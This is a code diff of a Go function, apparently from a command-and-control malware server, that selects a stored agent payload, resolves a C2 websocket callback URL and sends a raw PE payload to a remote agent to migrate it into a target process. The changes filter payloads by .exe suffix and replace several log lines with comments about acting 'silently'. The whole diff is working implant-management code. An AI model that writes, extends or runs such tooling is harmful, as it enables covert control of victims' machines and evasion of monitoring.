@@ -50,20 +50,19 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 
 	var raw []byte
 	var err error
-	
-	searchArch := client.Arch
-	if client.OS == "windows" {
-		if client.Arch == "x86_64" || client.Arch == "amd64" { searchArch = "windows_amd64" }
-	} else if client.OS == "linux" {
-		if client.Arch == "x86_64" || client.Arch == "amd64" { searchArch = "linux_amd64" }
-	}
 
-	// Search for latest built artifact for this architecture
-	matches, _ := filepath.Glob(filepath.Join("storage/payloads", fmt.Sprintf("agent_%s_*", searchArch)))
+	// Search for latest built artifact (filter by extension based on target OS)
+	matches, _ := filepath.Glob(filepath.Join("storage/payloads", "*"))
 	if len(matches) > 0 {
 		var bestMatch string
 		var bestTime time.Time
 		for _, m := range matches {
+			base := filepath.Base(m)
+			// Windows targets: must end with .exe
+			// Linux targets: must NOT end with .exe
+			if client.OS == "windows" && !strings.HasSuffix(base, ".exe") { continue }
+			if client.OS == "linux" && strings.HasSuffix(base, ".exe") { continue }
+			
 			if info, err := os.Stat(m); err == nil {
 				if info.ModTime().After(bestTime) {
 					bestTime = info.ModTime()
@@ -73,7 +72,7 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 		}
 		if bestMatch != "" {
 			raw, _ = os.ReadFile(bestMatch)
-			log.Printf("[Migration] Found latest artifact for %s: %s", searchArch, bestMatch)
+			// Artifact found silently
 		}
 	}
 
@@ -127,7 +126,7 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 		default:
 			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
 		}
-		log.Printf("[Migration] Using source listener %s URL: %s", ln.ID, c2url)
+		// Migration target resolved silently
 	}
 
 	if c2url == "" {
@@ -185,7 +184,7 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 	// (Donut shellcode conversion was removed due to Donut's incomplete
 	// CRT/TLS initialization causing BEX64 crashes in injected contexts.)
 	finalPayload := patched
-	log.Printf("[Migration] Sending raw PE payload (%d bytes) - client will spawn from disk", len(finalPayload))
+	log.Printf("\x1b[36m[Migration]\x1b[0m Payload sent to %s (%d bytes)", uuid, len(finalPayload))
 
 	reqID := fmt.Sprintf("MIG-%d", globals.GetNextReqID())
 	msg := globals.MessageWrapper{
@@ -204,6 +203,6 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 	_ = store.CreateCommandLog(uuid, reqID, "migrate", fmt.Sprintf("Target: %s", targetProcess))
 	
 	// Wait for response asynchronously or handled by GetResponse/WebSocket
-	log.Printf("[Migration] Sent memory payload for agent %s", uuid)
+	// Migration complete - agent will reconnect
 	return nil
 }
